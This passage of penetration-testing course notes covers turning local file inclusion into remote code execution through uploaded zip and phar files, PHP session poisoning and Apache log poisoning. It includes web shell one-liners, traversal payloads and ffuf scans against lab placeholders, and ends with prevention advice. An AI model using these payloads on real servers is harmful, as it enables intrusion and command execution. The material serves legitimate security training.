As we can see, we can use "`/profile_images/shell.gif`" for the file path. If we do not know where the file is uploaded, then we can fuzz for an **uploads directory**, and then fuzz for our uploaded file, though this may not always work as some web apps properly hide the uploaded files.

With the uploaded file path at hand, all we need to do is to include the uploaded file in the **LFI** vulnerable function, and the PHP code should get executed, as follows:
![[Pasted image 20250207213536.png]]
As we can see, we included our file and successfully executed the "`id`" command.

>[!Note]
To include to our uploaded file, we used `./profile_images/` as in this case the **LFI** vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path.
### Zip Upload
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. 

To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named "`shell.jpg`"), as follows:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
>[!Note]
Even though we named our zip archive as "``shell.jpg``", some upload forms may still detect our file as a zip archive through **content-type** tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the "`shell.jpg`" archive, we can include it with the `zip` wrapper as "`zip://shell.jpg`", and then refer to any files within it with `#shell.php` (URL encoded). 
Finally, we can execute commands as we always do with "`&cmd=id`", as follows:
![[Pasted image 20250207213550.png]]As we can see, this method also works in executing commands through zipped PHP scripts.
>[!Note]
We added the uploads directory (`./profile_images/`) before the file name, as the vulnerable page (`index.php`) is in the main directory.
### Phar Upload
Finally, we can use the "`phar://`" wrapper to achieve a similar result. To do so, we will first write the following PHP script into a "`shell.php`" file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. 

We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```bash
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called `shell.jpg`. 

Once we upload it to the web app, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with "`/shell.txt`" (URL encoded) to get the output of the command we specify with "`&cmd=id`", as follows:
![[Pasted image 20250207213604.png]]
As we can see, the `id` command was successfully executed. Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.
## Log Poisoning
We have seen in previously that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the "`Execute`" privileges. 

The attacks we will discuss here, all rely on the same concept: **Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.** 

For this attack to work, the PHP web app should have read privileges over the logged files, which vary from one server to another.

As was the case in the previous section, any of the following functions with "`Execute`" privileges should be vulnerable to these attacks:

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |

### PHP Session Poisoning
Most PHP web apps utilize `PHPSESSID` **cookies**, which can hold specific user-related data on the back-end, so the web app can keep track of user details through their cookies. 

These details are stored in `session` files on the back-end, and saved in "`/var/lib/php/sessions/`" on Linux and in "`C:\Windows\Temp\`" on Windows. 

The name of the file that contains our user's data matches the name of our "`PHPSESSID`" cookie with the "`sess_`" prefix. **For example**, if the `PHPSESSID` cookie is set to "`el4ukv0kqbvoirg7nkp4dncpk3`", then its location on disk would be "`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`".

The first thing we need to do in a **PHP Session Poisoning** attack is to examine our ``PHPSESSID`` session file and see if it contains any data we can control and poison. 

So, let's first check if we have a `PHPSESSID` cookie set to our session:
![[Pasted image 20250208165347.png]]
As we can see, our `PHPSESSID` cookie value is "`nhhv8i0o6ua4g88bkdl9u1fdsd`", so it should be stored at "`/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`". 

Let's try include this session file through the LFI vulnerability and view its contents:
![[Pasted image 20250208165416.png]]
We can see that the session file contains two values:
1. ``page``, which shows the selected language page, and 
2. `preference`, which shows the selected language. 

The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the "`?language=`" parameter.

Let's try setting the value of `page` a custom value (e.g. "`language parameter`") and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:
![[Pasted image 20250208165443.png]]
This time, the session file contains "**session_poisoning**" instead of "`es.php`", which confirms our ability to control the value of `page` in the session file. 

Our next step is to perform the **poisoning** step by writing PHP code to the session file. We can write a basic PHP web shell by changing the "`?language=`" parameter to a URL encoded web shell, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the "`&cmd=id`" to execute a commands:
![[Pasted image 20250208165456.png]]
### Server Log Poisoning
Both **Apache** and **Nginx** maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the **LFI** vulnerability, and for that we need to have **read-access over the logs**.

* **Nginx** logs are readable by low privileged users by default (like `www-data`), while 
* The **Apache** logs are only readable by users with high privileges (like `root` or  `adm` groups). However, in older or misconfigured **Apache** servers, these logs may be readable by low-privileged users.

By default, 
* **Apache** logs are located in
	* "`/var/log/apache2/`" on Linux 
	* "`C:\xampp\apache\logs\`" on Windows, while 
* **Nginx** logs are located in
	* "`/var/log/nginx/`" on Linux 
	* "`C:\nginx\log\`" on Windows. 

However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

So, let's try including the **Apache** access log from "`/var/log/apache2/access.log`", and see what we get:
![[Pasted image 20250208165511.png]]
As we can see, we can read the log. The log contains the
* `remote IP address`, 
* `request page`, 
* `response code`, and 
* the `User-Agent` header. 

As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

>[!Tip]
Logs usually are huge, and loading them in an **LFI** may take a while to load. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

To do so, we will use **Burp** to intercept our earlier **LFI** request and modify the `User-Agent` header to `Apache Log Poisoning`:
![[Pasted image 20250208165523.png]]
**Note:** As all requests to the server get logged, we can poison any request to the web app, and not necessarily the **LFI** one as we did above.

As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:
![[Pasted image 20250208165537.png]]
We may also poison the log by sending a request through `curl`, as follows:
```bash
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

As the log should now contain PHP code, the **LFI** vulnerability should execute this code, and we should be able to gain RCE. We can specify a command to be executed with "`?cmd=id`":
![[Pasted image 20250208165549.png]]
We see that we successfully executed the command. The exact same attack can be carried out on `Nginx` logs as well.

**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between ``0-50``), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over.:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through **LFI**, and if we do have access to them, we can try to poison them. 

For example, if the `SSH` or `FTP` services are exposed to us, and we can read their logs through **LFI**, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. 
# Automation and Prevention
## Automated Scanning
We can utilize fuzzing tools to test a huge list of common **LFI** payloads and see if any of them work, or we can utilize specialized **LFI** tools to test for such vulnerabilities. 
### Fuzzing Parameters
The HTML forms users can use on the web app front-end tend to be properly tested and well secured against different web attacks. 

However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. 
This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

For example, we can fuzz the page for common `GET` parameters, as follows:
```bash
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the **LFI** tests. This is not unique to **LFI** vulnerabilities but also applies to most web vulnerabilities, as exposed parameters may be vulnerable to any other vulnerability as well.
### LFI wordlists
So far we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise.

However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web apps where we need to test for various vulnerabilities.

There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files. 

We can use this wordlist to fuzz the "`?language=`" parameter we have been testing throughout the module, as follows:
```bash
$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

As we can see, the scan yielded a number of LFI payloads that can be used to exploit the vulnerability.
### Fuzzing Server Files
In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: 
* `Server webroot path`, 
* `Server configurations file`, and 
* `server logs`.
#### Server Webroot
We may need to know the full server Webroot path to complete our exploitation in some cases. 

For example, if we wanted to locate a file we uploaded, but we cannot reach its "`/uploads`" directory through relative paths (like: "`../../uploads`"). In such cases, we may need to figure out the server Webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the "`index.php`" file through common Webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). 

Depending on our LFI situation, we may need to add a few back directories (e.g. "`../../../../`"), and then add our "`index.php`" afterwards.

The following is an example of how we can do all of this with ``ffuf``:
```bash
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...
: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```
As we can see, the scan did indeed identify the correct Webroot path at "`/var/www/html/`". 

We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier, as it also contains various payloads that may reveal the Webroot. 

If this does not help us in identifying the webroot, then our best choice would be to read the server configurations.
#### Server Logs/Configurations
We need to be able to identify the correct **logs** directory to be able to perform the **log poisoning attacks**. 

Furthermore, we may also need to read the server configurations to be able to identify the server Webroot path and other important information (like the **logs** path).

To do so, we can use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first.

Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
```bash
$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...
 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```
As we can see, the scan returned over ``60`` results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist. 

Now, we can try reading any of these files to see whether we can get their content. We will read "`/etc/apache2/apache2.conf`", as it is a known path for the **Apache** server configuration:
```bash
$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```
As we can see, we do get the default **Webroot** path and the **log** path. 

However, in this case, the **log** path is using a global **Apache** variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is ("`/etc/apache2/envvars`"), and we can read it to find the variable values:
```bash
$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```
As we can see, the "`APACHE_LOG_DIR`" variable is set to "`/var/log/apache2`", and the previous configuration told us that the log files are "`/access.log`" and "`/error.log`".

>[!Note]
We can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the `PHP filters` section, and such efforts may reveal previously unknown information about the web app, which we can use to further exploit it.
### LFI Tools
We can use a number of LFI tools to automate much of the process, which may save time in some cases, but may also miss many vulnerabilities and files. 

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search **GitHub** for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution. 
## File Inclusion Prevention
The most effective thing we can do is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. 

Furthermore, in the first section, we discussed different functions that may be utilized to include other files within a page and mentioned the privileges each function has. Whenever any of these functions is used, we should ensure that no user input is directly going into them.

In some cases, this may not be feasible, as it may require changing the whole architecture of an existing web app. In such cases, we should utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded, while having a default value for all other inputs.

If we are dealing with an existing web app, we can create a **whitelist** that contains all existing paths used in the front-end, and then utilize this list to match the user input. Such a whitelist can have many shapes, like a database table that matches IDs to files, a "`case-match`" script that matches names to files, or even a static JSON map with names and files that can be matched.

Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulnerabilities.
### Preventing Directory Traversal
If attackers can control the directory, they can escape the web app and attack something they are more familiar with or use a "`universal attack chain`". Directory traversal could potentially allow attackers to do any of the following:
- Read `/etc/passwd` and potentially find ``SSH`` Keys or know valid user names for a password spray attack
- Find other services on the box such as ``Tomcat`` and read the `tomcat-users.xml` file
- Discover valid PHP Session Cookies and perform session hijacking
- Read current web app configuration and source code

**The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename.** 

For example, PHP has `basename()`, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final "``/``" as the filename. The downside to this method is that if the app needs to enter any directories, it will not be able to do it.

If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, go into your **home** directory (``cd ~``) and run the command "`cat .?/.*/.?/etc/passwd`". 

You'll see Bash allows for the "`?`" and "`*`" wildcards to be used as a "`.`". 

Now type "`php -a`" to enter the PHP CLI and run "`echo file_get_contents('.?/.*/.?/etc/passwd');`". 

You'll see PHP does not have the same behaviour with the wildcards, if you replace "`?`" and "`*`" with "`.`", the command will work as expected. 

This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the `system()` function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web app.

Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:
```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```
This code recursively **removes** "`../`" sub-strings, so even if the resulting string contains "`../`" it would still remove it, which would prevent some of the bypasses we attempted.
### Web Server Configuration
Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. 

For example, we should **globally disable the inclusion of remote files**. In PHP this can be done by setting "`allow_url_fopen`" and "`allow_url_include`" to ``Off``.

It's also often possible to lock web apps to their web root directory, preventing them from accessing non-web related files. The most common way to do this is by running the app within `Docker`.

However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding "`open_basedir = /var/www`" in the ``php.ini`` file. 

Furthermore, you should ensure that certain potentially dangerous modules are disabled, like [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html).

If these configurations are applied, it should prevent accessing files outside the web app folder, so even if an LFI vulnerability is identified, its impact would be reduced.
### Web Application Firewall (WAF)
The universal way to harden applications is to utilize a WAF, such as `ModSecurity`. 

When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. **ModSecurity** minimizes false positives by offering a `permissive` mode, which will only report things it would have blocked. 

This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the **WAF** to "``blocking mode``", just having it in ``permissive`` mode can be an early warning sign that your app is being attacked.

Finally, it is important to remember that the purpose of hardening is to give the app a stronger exterior shell, so when an attack does happen, the defenders have time to defend.  With proper hardening, attackers will leave many more signs.

You also need to understand, that the goal of hardening is not to make your system un-hackable. Hardened systems should be continually tested, especially after a zero-day is released for a related app to your system (ex: ``Apache Struts``, ``RAILS``, ``Django``, etc.). 

In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm whether the exploit was used against the system or not.
